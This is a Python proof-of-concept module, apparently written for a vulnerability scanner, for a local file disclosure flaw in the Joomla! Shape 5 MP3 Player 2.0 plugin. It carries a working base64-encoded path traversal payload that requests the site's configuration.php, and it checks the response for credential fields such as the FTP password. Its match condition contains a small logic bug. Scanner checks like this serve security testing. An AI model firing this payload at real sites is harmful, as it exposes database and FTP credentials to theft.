# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re

class Vuln(ABVuln):
    poc_id = 'c22a7ed8-f381-43ec-b39b-4ebcb6a0fcae'
    name = 'Joomla! 远程文件包含'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI # 漏洞类型
    disclosure_date = '2014-12-14'  # 漏洞公布时间
    desc = '''
        Joomla! Shape 5 MP3 Player 2.0 Local File Disclosure Exploit.
    '''  # 漏洞描述
    ref = 'https://0day.today/exploits/24724'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Joomla!'  # 漏洞应用名称
    product_version = 'Shape 5 MP3 Player 2.0'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '6aee9f6a-757f-4436-a300-5fe32382c00b'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-18'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            payload = '/plugins/content/s5_media_player/helper.php?fileurl=Li4vLi4vLi4vY29uZmlndXJhdGlvbi5waHA='
            verify_url = self.target + payload 
            r = requests.get(verify_url)

            if r.status_code == 200 and "public $ftp_pass" and "class JConfig {" in r.content:
                #security_hole(url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

                    
        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
